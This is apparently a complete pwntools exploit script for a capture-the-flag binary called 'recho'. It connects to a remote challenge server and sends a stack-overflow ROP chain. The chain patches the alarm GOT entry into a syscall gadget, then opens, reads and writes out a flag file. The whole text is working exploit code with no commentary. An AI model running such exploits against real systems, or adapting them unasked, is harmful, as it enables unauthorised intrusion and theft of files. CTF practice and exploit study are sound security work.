from pwn import *
context.update(arch='amd64', log_level='debug', endian='little')

# p = process('./recho')
p = remote('159.138.137.79',65458)
#gdb.attach(p)
e = ELF('./recho')
pop_rdi = 0x00000000004008a3
pop_rsi_r15 = 0x00000000004008a1
pop_rdx = 0x00000000004006fe
add_rdi_al = 0x000000000040070d
pop_rax = 0x00000000004006fc
flag = 0x601058
syscall = e.plt['alarm']


def pwn():
    payload = flat(['t3ls'.ljust(0x38, '\x00')])
    payload += flat([pop_rdi, e.got['alarm'], pop_rax, 5, add_rdi_al])
    payload += flat([pop_rdi, flag, pop_rsi_r15, 0, 0, pop_rdx, 0, pop_rax, 2, syscall])
    payload += flat([pop_rdi, 3, pop_rsi_r15, e.bss(0), 0, pop_rdx, 64, e.plt['read']])
    payload += flat([pop_rdi, 1, pop_rsi_r15, e.bss(0), 0, pop_rdx, 64, e.plt['write']])
    p.sendlineafter('server', str(0x1000))
    p.send(payload)
    p.shutdown()
    p.interactive()

if __name__ == '__main__':
    pwn()
